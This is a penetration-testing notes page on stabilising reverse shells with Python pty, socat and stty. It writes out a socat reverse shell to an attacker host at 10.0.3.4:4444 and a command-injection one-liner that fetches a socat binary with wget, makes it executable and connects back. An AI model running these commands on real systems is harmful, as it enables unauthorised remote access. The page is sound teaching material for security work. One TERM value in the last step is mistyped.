---
layout:
  width: default
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: false
  metadata:
    visible: true
---

# Shell Stabilisation

## Python pty Module

Once we have setup our dumb shell, a quick way to stabalise the shell is via [Pythons pty module](https://docs.python.org/2/library/pty.html). The pty module let’s us spawn a psuedo-terminal that can fool commands like `su` into thinking they are being executed in a proper terminal.

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

This will let us run `su` for example; in addition to providing a nicer prompt.

[![Python PTY](https://blog.ropnop.com/images/2017/07/python_pty.png)](https://blog.ropnop.com/images/2017/07/python_pty.png)

Unfortunately, this doesn’t get around some of the other issues, SIGINT (Ctrl-C) will still close Netcat, and there’s no tab-completion or history. But it’s a quick and easy.

Check out: [#upgrading-netcat](shell-stabilisation.md#upgrading-netcat "mention")

***

## Socat

[socat.md](../../../toolbox/tooling/network-tools/socat.md "mention") is a powerfull networking swiss-army knife, Socat can be used to pass full TTY’s over TCP connections.

If `socat` is installed on the target server, we can launch a reverse shell with it. We _must_ catch the connection with `socat` as well to get full functionality.

{% code title="Attacker Host" %}
```bash
socat file:`tty`,raw,echo=0 tcp-listen:4444
```
{% endcode %}

{% code title="Target Host" %}
```bash
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
{% endcode %}

If socat isn’t installed, there are standalone binaries that can be downloaded from this Github repo:

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

With a command injection vulnerability, it’s possible to download the correct architecture `socat` binary to a writable directoy, chmod it, then execute a reverse shell in one line:

{% code overflow="wrap" %}
```bash
wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
{% endcode %}

On Kali, we'd catch a fully interactive TTY session. It supports tab-completion, SIGINT/SIGSTP support, vim, up arrow history, etc.

***

## Upgrading Netcat

It is possible to use a dumb netcat shell to upgrade to a full TTY by setting some `stty` options within the Kali terminal.

{% stepper %}
{% step %}
### Python pty Module Setup

First, follow the same technique as in [#python-pty-module](shell-stabilisation.md#python-pty-module "mention") and use Python to spawn a PTY. Once bash is running in the PTY, background the shell with `Ctrl-Z`.

<figure><img src="../../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
{% endstep %}

{% step %}
### STTY Reconfig

While the shell is in the background, now examine the current terminal and STTY info so we can force the connected shell to match it:

<figure><img src="../../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
#### Required Information

The information needed is the TERM type (_“xterm-256color”_) and the size of the current TTY (_“rows 38; columns 116”_).
{% endhint %}

With the shell still backgrounded, now set the current STTY to type raw and tell it to echo the input characters with the following command:

```bash
stty raw -echo
```

With a raw stty, input/output will look weird and you won’t see the next commands, but as you type they are being processed.
{% endstep %}

{% step %}
### Reintialise the Terminal

Next foreground the shell with `fg`. It will re-open the reverse shell but formatting will be off. Finally, reinitialise the terminal with `reset`.

<figure><img src="../../../.gitbook/assets/image (3) (1).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
#### Note

In the above example, the `nc` command was not re-run, the `fg` command was enteered, but it was not echoed. The `nc` command is the job that is now in the foreground. The `reset` command was then entered into the netcat shell.
{% endhint %}
{% endstep %}

{% step %}
### STTY Resize

After the `reset` the shell should look normal again. The last step is to set the shell, terminal type and stty size to match our current Kali window (from the info gathered above).

```bash
$ export SHELL=bash
$ export TERM=xterm256-color
$ stty rows 38 columns 116
```

The end result is a fully interactive TTY with all the features we’d expect (tab-complete, history, job control, etc) all over a netcat connection:

<figure><img src="../../../.gitbook/assets/image (4) (1).png" alt=""><figcaption></figcaption></figure>
{% endstep %}
{% endstepper %}
